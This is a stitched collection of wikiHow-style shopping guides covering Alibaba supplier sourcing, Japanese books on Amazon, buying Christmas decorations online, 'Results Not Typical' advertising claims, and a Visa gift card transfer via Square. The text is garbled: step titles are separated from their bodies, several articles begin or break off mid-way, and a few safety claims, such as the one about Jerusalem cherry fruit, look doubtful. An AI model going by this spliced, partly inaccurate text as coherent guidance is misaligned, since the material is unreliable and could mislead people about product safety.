The Onsite Check verifies that the premises of suppliers based in China have been checked by Alibaba staff to ensure onsite operations actually exist.
The Assessed Supplier Check notes that the supplier has been verified by a third-party service.

, In addition to checking for profile badges, you can find information about prospective suppliers online to avoid scams. Search online for comments or complaints about the supplier. You can also cross reference the contact information provided on their Alibaba profile with a Google search.Avoid suppliers who list non-business email addresses, such as Gmail or Yahoo accounts.

, Searching Alibaba will yield suppliers in a number of countries. Finding a supplier based in or with a warehouse in your country will cut down on shipping time and eliminate the need for you to deal with clearing customs.Many suppliers, for example, have warehouses in the U.S. If you go with a supplier that doesn’t have a warehouse in your country, you’ll have to work with that supplier to manage customs clearance by using Alibaba’s Freight Logistics resource. In addition, it’s best to hire a customs broker to help you handle customs when sourcing products internationally.

, Click the “Contact Supplier” button, then enter a subject line and the message body. This message should include any questions you might have about the products as well as your purchase request.Alibaba purchasing is typically conducted in English, but be sure to keep your message concise and free of spelling or grammatical errors. Suppliers might run your message through Google Translate, so keep your language direct to avoid potential misunderstandings.

, The product listing will likely list a price per unit and minimum order quantity (MOQ). Note well that both of these are negotiable.When you contact the supplier, ask if they can accommodate quantity needs. Ask, “Is the listed MOQ of 500 units negotiable? Would you consider an order of 400 units?”
You can also ask, “At what quantity do you offer discounts?” If purchasing more units will lower your cost, and you’re confident you can move the extra inventory, you should consider going with a higher quantity to get the discount.

, You should also verify if the listed price is FOB, or Free On Board. This means that the seller pays the costs associated with transporting goods to the port of loading, and the buyer pays for costs associated with transport across the ocean to the final destination.Ask, “Is the listed price range of $2-3 (U.S.) per unit FOB? Can you provide a more accurate FOB quote at 400 units shipped to San Francisco, CA, USA?”
Note that all prices and shipping costs quoted on Alibaba are in US dollars.You contact your nearest bank or exchange agent for the most accurate exchange rate, or you can use an online conversion tool: http://www.xe.com/currencyconverter/


, You and the supplier can negotiate your payment currency and preferred payment method. If necessary, you can exchange currencies with your banking institution. Keep in mind the posted price is also negotiable.Ask the supplier something like, “What’s the best price you can do for this product? Can you do $2 (U.S.) per unit? This would help convince me to source from you regularly in the future.”

, When you contact a seller, you should also consider asking for samples before agreeing to purchase a large quantity of a specific product. That way, you can inspect for quality before spending money on hundreds or even thousands of units.Ask the supplier, “Do you offer product samples? What is the difference in pricing for samples?”

, When you are finished composing your message, proofread it for clarity and check for any errors, then click “Send.” Go to your sent box to make sure the message was actually sent to the supplier.If you don’t see your inquiry in the sent box, you should resend the message. To avoid having to compose your message again, copy and paste it into a separate document (like Google Docs) before sending.

, When you negotiate a payment method with the supplier, be sure to settle on a low-risk option. The best payment methods include Paypal or, for purchases over $20,000 (U.S.), obtaining a letter of credit (for example, through a banking institution).You can also go through a third-party escrow service, such as Alibaba’s secure payment service, which will hold the funds until both parties confirm delivery.Note that only suppliers located in mainland China, Hong Kong, and Taiwan are eligible to use their secure payment service.
Avoid Western Union transfers, which you should only use when transferring money to someone you know very well.

, Alibaba’s Freight Logistics resource helps the supplier determine and pay the costs of transporting goods internationally. You then pay the supplier the cost of transport. If they haven’t already, ask your supplier to log into Alibaba and visit its Logistics page to give you an accurate estimate of customs duties and taxes.Duties and taxes will vary based on you and your supplier’s locations.Remember that you can try to find a supplier with a warehouse in your country to avoid the cost of international transport.
You can also get an idea of your goods’ customs cost by using a duty calculator. Simply input your products’ information and countries of departure and arrival into the appropriate fields to determine a cost estimate: https://www.dutycalculator.com/


, Even though the supplier uses Alibaba Logistics to cover transport costs, you should still hire a customs broker just to be certain you’ve paid the proper duties and taxes, that your products will clear customs, and that you hold the proper licensing.It might cost a few hundred U.S. dollars, but a customs violation could cost thousands in fines, and you might face legal consequences.
In the U.S., you can find a customs broker using the search tool on the website of the National Customs Brokers and Forwarders Association of America.If you live outside the U.S., check with your nation’s customs and border control government website or search online for a customs broker.

, If your goods have been shipped across the ocean in freight container, you’ll need to arrange transport from the port to your location. Alibaba’s Logistics page can help you ship your products over land using a carrier like FedEx or by rail, depending on your location.If you live relatively close to the destination port, the cheapest option is to hire a trucking service or rent a truck to pick up your goods., Upon receiving your goods, be sure to inspect them thoroughly for quality and to be sure you’ve received the proper quantity. If you’ve received the wrong quantity or can prove that you’ve received products of a lower quality than advertised, you can file a complaint with Alibaba’s help center.


You’ll need to send photographs of the goods that show why you’re unsatisfied, along with the initial agreement, payment documents, and all correspondence between you and the supplier.Doing some research about your supplier before agreeing to the transaction will help ensure that you purchase goods that meet your standards. Be sure that they’re a verified supplier and remember to search online for complaints and comments from past clients.

, Branded goods sourced through Alibaba are likely to be counterfeit, and you could face legal consequences for reselling them. It's always best to purchase branded goods directly from the brand if you're buying wholesale to sell retail.If do purchase branded goods through Alibaba and receive counterfeits, you can file a dispute and send photographs of the products you received to Alibaba’s customer service. If you’ve paid through their secure payment system or through an escrow service, your chances of being refunded are almost certain.

Do an author search.,
Enter Japanese-specific search terms.,
Click on the book's Amazon name.,
Consider the cost.,
Understand that many Japanese dealers on Amazon have generic listings.",How to Buy Japanese Books on Amazon," Japanese books may be subjected to terrible translations, usually through an auto-translator. The title or author's name may be translated word for word that do not even approximate the true Japanese meaning. Because of this, performing searches on Amazon for certain books may come up with no results since the titles are not accurate. However, if you search for the author, you should examine the images in the results to see the true titles available. This will help you find the right books that you are looking for.;
, If you wish to browse titles rather than searching by author, entering important keywords such as ""bunko"" or ""tankobon"" will help separate out Japanese language materials. These words alone will bring back all of the mass-market (bunko) or hardcover (tanko) books on Amazon. Then, add keywords (Japanese and English) to specify your area of interest.


Be creative with your keywords. Try both English and Japanese.  For example, a book with ""senso"" in the title may have been auto-translated to ""war."" Therefore, you'll need to search both to make sure that you're hitting right the topic.

, Search within their listings, using specific terms such as Japanese, bunko, or tankobon. Generally, a seller who offers one Japanese book will be providing more. Take note of different sellers who have good quality books, as they might produce more in the future.

, Understand that Japanese books might have higher prices, especially if you're purchasing them from a different country. Shipping may also be higher due to import/shipping costs. Nevertheless, the difference should not be too great, depending on the price of the book itself.


Be sure that you're getting the best deal. Use sites similar to www.kosho.or.jp in order to see how much the books would cost in Japan.
Keep in mind that most domestic Japanese dealers will not ship overseas. Those that do will often charge you fifteen to twenty-five dollars per title for the service. Therefore, if you find a book selling in the United States that's equivalent to the Japanese price, you've discovered an extremely good deal.
If the book is 25%-50% more than the Japanese price, it may still be a good deal, considering the shipping costs.

, This means that they do not have the listed books in stock. Instead, they are confident that they can find them for you at cheaper domestic prices in Japan while still making a profit after shipping. Therefore, when placing an order on Japanese books, be cautious. There is no guarantee that you'll be satisfied with your purchase.


If you use these dealers, be aware that you may have to wait for a long time before your order is filled. As the listings are generic, you cannot be certain of the book's exact condition once you receive it.
Realize that some Japanese dealers may use a variety of different names.

The reason these dealers use multiple names is that their feedback invariably drops over time, so they simply shift their inventory to a new name and start again. 
They also price books based on the lowest Amazon price. Therefore, their prices may be totally out of alignment with the actual price/value of the book. 
The vast majority of Japanese books offered on Amazon are from these dealers, and they offer many choices. Therefore, if there are no other options and you really need the book, you may have to go to them. 
When possible, use a domestic (US) dealer, as you can easily return these books if they're not right.

Consider year-round Christmas shops: These shops specialize in holiday decor.,
Look at retail stores.,
Consider liquidation discount shops.,
Look at wholesale options.,

Read the descriptions and make certain how the decoration will arrive.,
Look for decor from a company that sets high quality standards and those with signs of good craftsmanship.,
Beware of the same-brand/different-box or different-brand/ same-box syndrome.",How to Buy Christmas Decorations Online," Sometimes they sell a specific item, like Hudson Valley Trees specializes in artificial trees. There are several sites out there that specialize entirely on Christmas light sets. Others like Bronner's Christmas Store in Frankenmuth, Michigan, sell everything Christmas for the entire year. If an item goes out of stock, unless it's a limited edition, a rare item hardly ever made, or it's no longer in production, it'll likely be back soon, usually in a few days or weeks. Some will even special order an item for you, if they can.;
, These can be places people shop in general like Sears, Macy's, Walmart, Target or they can be another store that is exclusively online or mail-order like Fingerhut, Frontgate or maybe like a local garden shop in town that also sells things online. These sites are pretty much the same store you could go to in person, look through the printed catalogs only online with other items not sold in stores or web exclusive items only available from purchasing via online. The same also applies to coupons. When an item goes out of stock in that store, you might as well wait until next year or forget it. Craft stores like JoAnn's, Micheal's, Hobby Lobby and home improvement stores like ACE Hardware, Home Depot, Menard's, and Lowe's also belong here.


Often times these stores will sale merchandise from a different store or site. You'll know this when you see a completely different store name from the store site your on.

, These stores buy what other stores have left behind, like returns, discontinued, bad sales, or buy a lot of things in wholesale in large quantities and pass the savings to you. Overstock and Wayfair are good examples. It's first come, first served on items being on stock here. When it's gone, it's gone!

, This is when you are buying directly from the factory or from a company that has close ties to that company. The method is selling by bulk. This mains you are buying in quantity. Many of the whole sale items have a minimum number of an item you can buy. Some items are sold in singles or pairs but others you need to buy like 100 or more. Who needs a 1000 red shiny apple ornaments? The more you buy the more you save. The items here may never go out of stock unless there's a monstrously huge demand that sells the entire stock out or they stop producing it. Alibada.com is an Asian example of such a site.


Don't confuse wholesale with low quality. Many times wholesale can equal or even have higher quality than retail.
Expect higher selection from a wholesale store than a retail store. Many wholesalers will be willing to let you customize your purchase by mixing and matching your selections. Like you can buy the same ornament in different colors, designs and patterns. The same brand can offer different characters and shapes as well.

, These places can sell either used or new items. Availability and stocking here is very variable and can also have any of the features of the other categories listed above depending on the vendor or store.



Amazon is an example of an online marketplace where multiple stores are combined into one like a huge online mall. Sometimes two users or two stores will have the same exact item for sale for different prices and shipping rates. Amazon can also sell things from another stores like Walmart.

Ebay is a lot like Amazon.Some vendors have a concrete (Buy it Now) price like any other store and others will have auctions where one user posts an item for a limited time. Other users place bids in money amounts over the asking original price. Each time a bid is outbid the minimum price you can post will increase. When the time expires, the user with the highest bid wins the item. Also sometimes you'll see ""Buy it Now"" where if you post that same price the you win automatically. Some stores and vendors will only sale an item to a buyer that has a PayPal account, which is an electronic money management site.
Etsy is a flea marketish, art gallery-like, crafty website where you can find decor that the users made (hand made crafts)or collected /are collecting, small scale productions and collectibles. There are a lot of antiques here as well. Many of the vendors here can also make an custom item for you or let you leave a request for a specific item so the vendor can contact you if it's in stock.
Craigslist and garage sale (estate) are also an option. There several other sites that pretty much are like an online version of reading Classified Ads in a printed newspaper or responding to a post of an yard/garage sale while out on the town. Many sellers choose this option because it's free of charges that Ebay and Amazon charge.They are similar new sites and apps like WallPop appearing let users post photos of the items they want to sell on that site or forum and ones who want to buy that item give offers, quotes or deals for that item.

, It can really pay off to be adventurous and get off the Christmas bandwagon when shopping. The exact same Flickering Light Set offered for clearance for Halloween? Maybe that purple light set can go greatly with a Sugar Plum Fairy theme. Floral, fabric, party and bridal stores offer endless selections and alternatives for ribbons, bows, rhinestones, tinsel and aluminum shapes, fancy roping and tassels, ball ornaments, bead strands for garlands, as well as floral picks. The color and design options are endless and prices can be cheaper than Christmas shops.


Don't be afraid to be inventive. Many floral fillers can be made to hang on a tree just by either tying any ribbon or string in a loop or poking the ornament with any hanger or loops you can find at a jewelry making, crafts or hardware shop. Consider making a mantle cover, tablecloth/runner or tree skirt by purchasing any fabric by the yard and draping it around the tree stand or neatly over the table shelf or mantle. There's also the option of spray painting and adding glitter to plain items. Have fun!

, There's a bunch of schemes and tricks used in advertisements on the web that can easily distract any online shopper. When the shopper is distracted there's more changes of impulse purchases (purchases brought at first site without good judgement) and the original shopping list, goals and budget to get larger than intended.


One marketing scheme is the professionally decorated room or the pre-selected theme. Like stores use the perfectly decorated tree and those nicely decorated scenes, the sites use the same process. This might cause the consumer to make impulsive purchases or try to duplicate that tree or scene.However the color trend or fad of 2015 may be out by 2016. Also decorating tastes and styles are very likely to change over time. There's also many times a list of the exact items and the exact number of the specific items to use in that setup with instructions. There may more links for other accessories and tools... Watch out! It's best to purchase a few of the items from the theme or set and move on.
Watch what you click! When visiting Pinterest, Facebook, or a gallery picture of a decorated tree on a decorator or home/style magazine note you (mostly) are clicking ads disguised as pictures. One click for one ornament can turn into a whole day of searching an entire theme or site and purchasing more items from that company than intended. Or clicking on an entirely different ad that goes back to a same store over again! The more traffic (visits) a company gets the more profits it makes. The companies use this to pay the decor designers, the website designer, the editors, the photographer, for website upkeep and shipping the decor to their store. This also raises the prices you pay for decor from such stores.
Another marketing strategy is the color name game. Just like an art, fabric, or paint stores have a lot of different names for the same color Christmas decor sellers also use the same idea. It's making a color sound or seem more festive or worth having than another.Often times an identical ornament can have the identical color but the color can be a totally different name. Christmas Green becomes Emerald Green, Balsam, or Holly Green. One must remember that not every holly leaf or emerald gemstone is really one exact color. Sometimes the name of the color will be exactly the same but the color you see on the scene or receive upon delivery is completely different.
Also the color of the item can vary from scene to scene depending on the display settings on that device or the model or brand of the device. Many of photos on the store sites may be edited by photo editing software (Photoshop) and also colors in the background of the item or the kind of lighting used while the photograph was token can also affect how the color appears. Also the settings of the scanner (device used to get a photograph on the computer screen) can also throw off colors. Any color red or pink can be difficult to reproduce exactly. A crimson or ruby (purplish-red) apple ornament can actually in real-life be scarlet (bright orangish red) or salmon (orange-pink) in real life.

, Stay away from using very generic searches that are vague. Don't just say Christmas decor, or you'll get flooded with millions of results and get lost. Instead of typing ""red ball ornaments,"" type ""red glass ball shiny ornaments."" Whenever you can, type brands and other specific terms to narrow your searches down. Knowing the size, brand or artist you want will help narrow things down to precise details.


Use your search engine filters. For example, on Ebay you can check the boxes and slider bars that help you narrow down the condition, price, size, color, material etc. Some sites like Bing and Google and a number of apps let you search for an item by uploading or scanning a picture of an item and submitting to the search engine search box. You can learn what they are and how much and where to purchase it. Many smartphone apps use Barcode or QR Codes in the same manner.
Watch out for results that are hidden as ads that may not lead you to the site listed on it. This can also lead to viruses and malware that can harm the computer or device your using.Google labels such results but other sites don't.

, Coupons and promo codes are easy to find on websites of shops, in Christmas forums and blogs, on Facebook, or on coupon sites like RetailMeNot. Watch for sales as well. Pay attention when you watch a video or the TV or radio for those codes. Reading newspapers and magazines may yield new sales for saving money as well as new site options.

, There are a some sites that let you compare prices for the exact same item within different stores. Examples of these include Pricegrabber, Google Shopping, Nextag, Shopzilla, Shopping.com, Bing Shopping. These are like search engines that collect information about prices from sellers and give the prices to you. Some sites like Ebay and Amazon will have this already built in and you get the results automatically.Often you will get the price with shipping and handling included other sites do not.

, Swagbucks, Ebates, Beezid are examples of sites that give points for every cent or dollar you spend in a shop while on their site or using an extension, app or button installed on the browser's toolbar. These ""points"" can depending on that site be converted into gift cards or a check. It's like an online version of a mail-in rebate you receive at stores while in person.

, Shipping and handling can present the consumer with surprises. Sometimes an item is very cheaply priced, but the shipping cost can make you pay more than just buying the ornament in a store in person. Some international sites have free shipping but the object being shipped has to go through customs and inspections, and this can take weeks or months.


Some sites will have site-to-store shipping options where you can have the store ship the item to a location of your choice. Many retailers like Walmart or Target will have this. This is free but may not be so good for your time, transportation, or gas budget, since you have to go and pick the item up.
When filling out the shipping information, like your address, zip code, and city, make sure the information is accurate. If the shipping address is different from the billing address make sure you have this correct. Postal Services and UPS would love to charge you extra for little mistakes like you not being there to get the package and signing it. Same goes for companies! Restocking fees and return fees can add up! Be careful.
If shipping cost are not on the site or in a shipping page link. Make a ""pretend checkout"" and when the site asks you for payment you'll get a whole total with the shipping cost added. After you find out the shipping rate you can cancel out the site by closing the browser down and clearing the history

, Don't overpay for off-brand low quality lights when you can get cheaper ones that are a name brand. Quality and construction is important. Don't forget to read the descriptions for size, color and material. Sometimes it pays to do research on brand by visiting its site and reading reviews.

, The pine, spruce or fir rule doesn't necessarily mean the product has to really resemble the natural counterparts outside. Also same names are made up. Instead follow these guidelines.



Height and Diameter: You don't want a 10 foot tall tree in a 6 foot tall room or very likely a 10 inch wreath on a 18 foot window. The diameter is the width around the widest branches across the entire tree (usually the bottom). You can almost always bend the branches to make them less wide but unless you are a pro you can't make a tree shorter. Be careful with names like slim, tabletop, grand as each designer has his or her own perception of how big or small each one is. If you don't have specific measurements in a room measure it or get a technician or carpenter to do this for you. Or use a lazer measuring device sold in home improvement/hardware stores.

Number of branches or tips: The more tips and branches the more fuller the product will be. More tips can mean more room for decorations as well. If you want a wild mountain look or want to keep a room bright pick a product with less branches.

The construction which gives hint about the assembly: Many trees come already fully assembled with or without hinges. Hinges make the tree fold out and in like an umbrella which makes assembly a breeze. Other trees come with the tree ""trunk"" and branches in pieces you attach to the pole. Some of these have the bottom of the branches color coded so you know which branches go on top and which on bottom. Others, get ready to to play a guessing game.

The material the tree is made off: Some ""evergreens"" are actually made of feathers of geese and ducks. There are artificial evergreens are made of a polyester, nylon, shredded, ribbon fabric material which is soft and pleasant to work with. There are other ""evergreens"" however that are made with very hard and sharp plastic or even metal that is very sharp and dangerous to work with. Also make sure the wires are coated with PVC and not exposed to prevent the presence of shock and fire. Sharp plastic and ""needles"" can cut wires of lights as well.

, Try to stay away from old, outdated holiday electronics because they are not built to current codes of proper authorities.


Many older light sets burn hotter, blow bulbs and fuses, stop lighting and or burn too much energy. These most likely won't have the new ""stay lit technology"" or lamp locks. Fire and electric shock risks are more likely with these than with newer models.
Old blow-mold or decorations that act like a lamp can be updated by having the old wiring replaced and replacing the old bulb with cooler burning current ones that are the correct size of the socket. You can also replace an entire set of large classic light bulbs(C-9,C-5) with cooler burning LED bulbs.
Know the ratings of your electronics. Look for the UL (Underwriters Laboratories) ratings on electronic decorations including battery operated. Low Voltage Directive is an European version which means that the product has had at least some testing and research for strict categories and standards. The wattage is also important.
Know how many of an electronic project (mainly light sets) can connect within a single connection. There should be a number of possible sets that can connect listed on this package. Do not connect more than this number of the identical set or go over the wattage maximum (when using nonidentical sets) on the package to avoid blown fuses and shortages. Make sure your extension cord and/or outlets can handle the wattage without overloading. These are also listed on the caution tags attached to the cord or on the package of a newly purchased cord.

, Some wires on some electronics aren't really made for withstanding severe cold.Sometimes the lights on a electronic device like a wreath are outdoor rated but the material the wreath is made out of or ornaments and other decor on the wreath itself are not. The control boxes, twinkling bulbs and red tipped flashing bulbs are sensitive to cold. Cold and wet can also cause flashing light sets not to flash or the effects of chasing/function lights to not work as they would on a warmer or dryer day. Placing decor in non-recommended situations voids the warranty on them. This also many times includes leaving the item installed year-round or over 1 to 4 month.


Keep ""indoor rated"" electronics away from damp situations and water.Many indoor decorations can be placed in a sheltered spot safe from the sun, extreme temperatures, or rain and snow. The sheltered porch, on the door is less like likely to do much harm. If these are exposed to a lot of water or a flood it's best to be safe and throw out.
Even ""outdoor rated"" electronics can't withstand everything nature throws at them. Make sure you take measures like protecting the outlets and connections by covering them with plastic or tape or tucking outlets and connections in deep within like an evergreen bush or in a tree hole. These items give off a lot heat and can cause sparks and fire easily within a house.
Visit the stores you can in person to find out about the specific brands and what the specific light set or pre-lit decor looks like when on whenever possible. Many stores will light the set for you or have it displayed in some way. Video demos may not work because the colors on the video vary via monitor display settings on the screen your using.
Make sure you know the bulb size in actual measurements. The name C-7, C-9, M-5 for example are really there for guidelines and are not really specific measurements for companies to use. The tiny thumbnail image of the bulb on the site or package or the product being shown used as a decoration can be misleading.
If there aren't any pre-light or pre-decorated decor that is suitable for outdoor use that is desired, consider purchasing an non-decorated outdoor rated version, and then purchasing outdoor suitable decorations for it. Stores that sell funeral floral decorations which are made for outdoor displays may have lots of options for decorating such items.You can then decorate the item yourself or have a decorator friend or local florist do this for you.

, Many things can go wrong with holiday electronics. Many times it's not the product itself it's how it's been designed or a misunderstanding of the effect or how it's constructed.


Many of the lighted decor you come across will consist of multiple smaller sets connected to form one big set. If any of the strands shall not function correctly there will be a gap in your design. It can be a time-consuming chore trying to find a few 10 loose or blown out bulbs on a tree with 2000 lights. The same also goes for curtain or icicle light sets, swag lights, lighted 20 wire trees and any lighted sculptures.
Many of the larger sets like sets of 300 lights are really 2 or more smaller sets plugged into on one with end to end plugs or 2 separate sets. In many cases it's better and less expensive to buy several small sets of a specific light set and connect them as you go. High count light sets are more difficult to maintain and more costly to replace.
When shopping chasing, musical or computer function light sets get the ones with the even number of strands like 2 or 4 way. The 3 way sets will skip or miss a step messing up the effect. This also is true when a strand on the set breaks down. Effects of LED twinkling sets and incandescent twinkling sets are totally different. Some of the ""twinkling"" sets are really separate stands each with a red-tipped bulb on each strand making each strand flash at random independently of each other. True twinkling sets have independent single bulbs within the set that blink randomly.
Use caution when considering the purchase of novelty light sets with special design bulbs.These may be more sensitive than regular bulbs. Keep the model name or/and number of these sets so you can be able to find the replacement bulbs or want to purchase the set again. Make sure you are able to find the replacement bulbs and where to buy them. Sometimes the bulb is covered by a twist off or pull off cover which is removed to reveal the bulb inside. Other times it's the whole bulb itself has to removed then replaced. Sometimes you come across light covers for average light sets. If using make sure the covers don't make the set malfunction or act different.
Many mini bulb sets have bulbs that look like clones, however in some cases only the replacement bulbs for that company that manufactured specifically that set is accepted on it. Also it can be only the replacement bulbs for that specific model by the same company. Bad replacements will act strange.

, LED is a new and relative young technology.These light emitting diodes as they called burn cooler and with the right brands burn brighter than traditional light sets. The often times plastic bulbs make them break-resistant. The colored versions don't fade as easily as well. Many sets can connect 30 to 60 number of the identical set. These new innovative lights give seasonal decorators lots of new options. However there are some common pitfalls here to watch out for.


LED sets can have the same malfunctions as regular (incandescent) sets and lighted decor. Mentioned above.
Some of the older LEDs have ugly ""converters"" within the set on the wire itself. The newer ones have ""converters"" that not so obvious or hidden within the bulb socket or plug. Many low quality LED sets will also flicker and buzz, start bright the first year than next year shine dimmer or never burn bright at all.
LEDs called Rice Lights which are also called Micro Lights have tiny bulbs and fine wires but can also have clumsy large plugs and adapters.
Some LEDs are made with removable replaceable bulbs. Some have the lights built into the set itself and they cannot be removed or replaced. When replacing LEDs don't change the order of the color arrangement. LED colors each have a specific wattage and if you replace a bulb in different order than original the set can get a shortage and fail to work.
LED Light colors can be tricky and may or may not be exactly like they seem on the site or package. White for example comes in pure white, cool white, and warm white.Pure white is the approximate color of bright white typing paper and has no colors in it. Cool white has a bluish tone like the ""daylight"" household bulbs and craft light have. Warm white is yellowish like traditional lights or candlelight. However there are variables to this rule and some warm whites turn out pure white or pure whites almost are cool whites. Pinks can be tricky too! Some pinks are purple not pink. Other pinks are fleshy skin colored.
Also there are LED products that are made to look more like ""incandescent"" colors. These colors are more ""softer"" look than regular LEDs. Softer means more like ""pastel"" or ""chalky"" colors like the old fashioned bulbs of yesteryear or regular incandescent light sets.
Also many LED sets or stores that sell them have different names for the same color. Halloween's ""orange"" becomes in some cases Christmas's ""amber"". ""Gold"" and ""yellow"" can be used as names but are the same color in some stores. ""Tropical blue"" is ""cool white"" in some cases.

, Beware if you, family, or a potential guest have allergic reactions to strong perfumes or colognes or just artificial fragrances. Some people are allergic to smells of certain plants. Unless you are buying from a reputable brand you trust with fragrances, you are at risk to being shipped something that could make you sick. You can copy or adopt these by buying non fragrant items and putting them in a container with a trusted potpourri, a brand of fragrance you trust, natural herbs, fragrant natural flowers or even evergreen branches and fresh pine cones from the woods (after washing them first to remove bugs).


If you see a fragrance type, chemical or flower name from a fragrance being sold and you or anyone you are expecting a visit from during the holiday season have an allergy to it, don't buy it. If something is only listed as ""fragrances"" on the package, be safe and don't buy it.
Whenever a new fragrant object starts causing you or anyone in the room problems like headaches, strange behavior, fatigue, breaking out in welts, hives, itching or breathing problems. Put the object in a sealed container and return it to the place you purchased it from. Don't wait for ""the strength of the scent to get weaker on Christmas"". There are other better, safer alternatives.

, Pretty decor doesn't mean safe decor. You might accidentally have had items delivered to your home with hazards like a unknown chemicals, unwanted critters, fire hazards and potential injury and death. If you find something wrong or something about it in your gut does not feel right about it send it back.


Older decorations can contain lead and some newer plastic and ""metal"" ornament sets will give off a chemical smell. Plastic ornaments, ""metal"" and really bad acrylic ones also break down and turn brittle and shatter like glass! Not all ""metal"" is actually real metal! Sometimes it's plastic painted with metallic paint. It can also be some weak wrongly processed mixture of metal and alloys (mixtures). Flocking rather in a can or on decorations made to look snowy may be made of some material you don't know about and can cause allergies or health problems.
Styrofoam materials are fire hazards and can cash fire immediately if exposed to open flame or high heat. Some other materials used as some kinds fabric or even some natural materials that haven't been treated with fireproof spray can ignite into deadly flame quickly. Many Styrofoam materials you get shipped are completed sealed and are not really flammable unless the fire burns through the covering and gets to the foam. Always keep fire hazard materials away from flames, heat and hot light bulbs. Hay, paper, straw, old dried out wreaths, garlands, trees and pine cones can also present fire risk.
Other fire hazards evolving Christmas decoration can be bad combos. If you put flocking on first then a fine decorative product called angel hair there's no risk. However if you spray flocking on angel hair the two will form a potential flame ready to happen.
Beware of also hidden pests, mold and in fabric materials bedbugs. Some times a object shipped might have lingering perfumes from previous locations and also silicate anti-moisture stuff which needs to be kept away form kids and pets so it's not accidentally ingested.
Falling apart decorative pieces will present choking hazards.Any ornament that has nails, sewing pins, screws that fall off can also cause potential injuries. Sharp plastic, wood, and metal can be just as bad as broken glass.
Be aware of the chemicals used in glass ornaments. Use caution when purchasing mercury glass and leaded crystal decor. Mercury glass doesn't have mercury chemicals in it however it contains silver and other colorants and metals in it that can be equally toxic if ingested. Many ""crystal"" decorations may contain lead. Quality crystal from reputable dealers like Waterford and Swarovski have very strict limits on how much lead is used in the glass and are also carefully monitored by government,however some other ones may or may not be so carefully watched. Sometimes chemicals within the ornament are released in a cloud if the ornament is shattered. Also use this caution with any metal ornaments. Like some people are allergic to gold and silver chemicals in any metal or glass can cause similar reactions. Don't let pets or children put metal in their mouths.Christmas light wires also contain lead. Don't let pets or children put these wires in their months. Also after working with lights wash hands.
Some live plants, or natural materials could also contain the next major insect, rodent or weed infestation that must be exterminated or poisonous chemicals on the plant,in the container or soil it's potted in.
Also some classic holiday plants and houseplants are hazardous. Many are poisonous to eat. There are others that poisonous to touch and to eat. Others are poisonous to touch. A number also have poisonous sap that can do harm if you get it in your eyes, nose ,mouth or on an open cut or wound. When ever you buy a plant get it's botanical name.This name is the one written differently on the garden tag (in italics) or is a strange name. and is will help you find out about how toxic a plant is for pet and/or human consumption. Mistletoe, Poinsettia, Paperwhites, Amaryllis, Tulips, Hyacinth, Narcissus, are poisonous. Some also have sharp thorns and sharp leaves. All ornamental peppers(Solanaceae) including the Jerusalem Cherry have non-poisonous yet hot fruit but the rest of the plant is toxic.

, Check over the details as many times you wish to avoid surprises.


Assembly and more supplies required? Sometimes ornament are shipped in deconstructed or ""ready-to-make"" condition. This means actually putting the ornament together using instructions that come with it or viewing the tutorial on a site to complete it. Sometimes you'll receive only a sheet of paper with instructions and patterns.
Make sure to also look for a count number for the quantity or number of ornaments your getting. Sometimes someone will click for one ornament and get the package with a whole set of them.
Make sure you know if the tree or wreath comes decorated with the decor on it, sold with the decor included, or comes by itself. Some light wires even come only with the wires and not the bulbs! And a big box of bulbs for lights but there's no wire! Some decor runs by batteries.

, Beware of items that made without good construction and those that are too old to survive. These things will fall apart and require repair or throwing into the trash. A new ornament is not supposed perform as if it's an antique and should last for years. Some decorations are supposed to be fragile but other decorations being sold that are supposed to be sturdy are not really worth the investment.


Some old and poorly constructed artificial ""evergreen"" material will shed their ""needles"" and leave you with bare wires. Some silk floral will actually ""pop"" off because they are simply glued or ""snapped""on and not taped or wired on. Old tinsel trees and garland will shred or became dull and flat like old carpet.
A cheap, poorly made bird or fabric-covered ornament will have the coverings come off the base form leaving it completely naked.
Old wood ornaments will snap apart or peel paint if not made correctly.
Sometimes a buyer can receive old worn out stuff that been on the shelf for years.
Beware what you're getting before you buy. Check reviews for the seller and the product.

, Many times a company make the same identical product for different stores and have them sold in differently colored or designed packages. Same colors but difference backgrounds and letter formats.


Changes may be slight to totally different. Looking for a manufacturer name may help, but sometimes it's hidden or replaced by the store name or logo. However many times you'll have that ""Did I just have this brand before..."" or ""This brand works exactly like..."" feeling.
Sometimes two very different brands will be in an identical package. Try to avoid the low quality knockoff, aka cheap copycat. Look for clues and read reviews from other buyers.

Understand what's behind the phrase.,
Realize what this phrase is not telling you.,
Do some critical thinking of your own.,
Go online and ask others what their impressions are.,
Speak with people you trust and whom you know are savvy about assessing advertising claims.,
Ask the seller questions.,
Be realistic and apply your common sense.","How to Grasp the Meaning of ""Results Not Typical"""," The phrase is an admission that the case, outcome or state of being presented to you, the consumer, is not a standard result. The advertiser has taken a particular instance of incredible success as a result of using their product, service or scheme and has made a big deal out of this one success for the sake of the advertisement.;
, You are not getting to find out some rather important information, such as:


Just how many people do get the advertised results?
How many people fail to gain the phenomenal success the non-typical example is espousing?
How much effort of my own is needed to get to the same standard?
How much of my own resources (generally financial) do I need to put towards even having a hope of getting the non-typical results?

, How realistic do the claims made seem to you? If it seems too good to be true, then it probably is. If it seems like the person in the advertisement was paid to say what they've said, was given some bonus or happens to be associated to the company through relationships or employment, then be ultra wary.

, People who have tried the product, service or scheme may already have left their comments (be they complaints or praise) in a consumer forum or somewhere else online.

, If you have a sense of uncertainty about buying into the advertised item or service, talk to people you trust about it and get their opinion before spending (and potentially wasting) your money.

, There is no harm asking questions of the seller. The answers (or lack thereof) can tell you a lot about the integrity of those in the company. Things to ask might include:


Can you please tell me exactly how many people have lost 50 pounds/earned $50,000 a month 12 months in a row/trained their baby to sleep at the click of a finger using your program/item/scheme/service, etc.
What additional costs can I expect to have to pay besides the joining fee shown on the advertisement?
I can't see any costs advertised. What costs am I likely to incur if I join this scheme?
How many hours of effort/work/trialing will I have to put in to get the results that are advertised?
And so forth.

, Whenever something sounds too good to be true or leaves out too much information about costs and efforts, it's probably best to keep away. On the other hand, if it is a product/scheme/service where the results can be achieved through consistent dedication and hard work and you're prepared to put this in on top of whatever you have to pay, then it may just be successful. But do your background checking and homework first. If it's fishy, leave it well alone and keep your money for something trustworthy.


If you don't get answers to your questions above, walk away.
If you get answers that are indirect, hedge around the issue or sound downright false, walk away.

Check the Visa gift card balance.",How to Transfer a Visa Gift Card Balance to Your Bank Account with Square," Many cards come pre-activated, so you don't have to worry about this unless the card says that it has to be activated.;
, This can be done either by going to a website or calling a number (both will be on the card). Remember the balance and minimize the number of balance checks. Some issuers of Visa gift cards charge a fee to check the balance, speak with customers service and just about anything else.

